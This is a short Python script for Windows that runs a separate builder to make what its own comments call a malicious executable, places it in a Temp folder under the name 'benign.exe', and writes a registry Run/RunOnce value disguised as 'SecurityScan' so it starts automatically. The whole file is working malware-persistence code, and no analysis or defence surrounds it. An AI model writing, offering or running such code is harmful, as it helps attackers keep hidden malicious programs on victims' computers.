import os
import shutil
import winreg

file_dir = os.path.join(os.getcwd(), 'Temp')
file_name = 'benign.exe'
file_path = os.path.join(file_dir, file_name)

if os.path.isfile(file_path):
    os.remove(file_path)

# Use BuildExe to create malicious executable
os.system('python BuildExe.py')

# Move malicious executable to desired directory
shutil.move(file_name, file_dir)

# Windows default autorun keys:
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
# HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
# HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

reg_key = 1

if reg_key < 2:
    reg_hive = winreg.HKEY_CURRENT_USER
else:
    reg_hive = winreg.HKEY_LOCAL_MACHINE
if (reg_key % 2) == 0:
    reg_path = 'Software\Microsoft\Windows\CurrentVersion\Run'
else:
    reg_path = 'Software\Microsoft\Windows\CurrentVersion\RunOnce'

# Add registry autorun key
reg = winreg.ConnectRegistry(None, reg_hive)
key = winreg.OpenKey(reg, reg_path, 0, access=winreg.KEY_WRITE)
winreg.SetValueEx(key, 'SecurityScan', 0, winreg.REG_SZ, file_path)
